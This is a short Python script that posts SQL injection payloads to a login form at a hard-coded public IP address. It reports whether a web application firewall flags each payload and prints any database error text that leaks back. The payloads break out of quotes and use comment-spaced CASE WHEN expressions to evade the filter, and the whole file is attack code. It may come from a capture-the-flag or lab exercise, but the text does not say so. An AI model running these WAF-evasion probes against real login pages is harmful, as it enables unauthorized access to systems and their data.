import requests

def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": payload, "password": "x"})
    print(f"[{label:35}] len={len(r.text)} waf={'BLOCKED' if 'Suspicious' in r.text else 'clean'}")
    # print any error-like text
    for kw in ["error", "SQL", "syntax", "mysql", "Warning"]:
        if kw.lower() in r.text.lower():
            idx = r.text.lower().find(kw.lower())
            print("   ->", r.text[max(0,idx-50):idx+100])

test("admin''''''", "many-quotes-break-syntax")
test("admin'/**/CASE/**/WHEN/**/1>0/**/THEN/**/1/**/END", "case-no-comment-terminator")
# Try CASE as the value itself: username = '' CASE ... END style doesn't make sense either
# Try using CASE to build the '1'='1' boolean via arithmetic instead of comparison keyword
test("admin'+CASE/**/WHEN/**/1>0/**/THEN/**/''/**/END/**/+'", "case-string-concat-attempt")
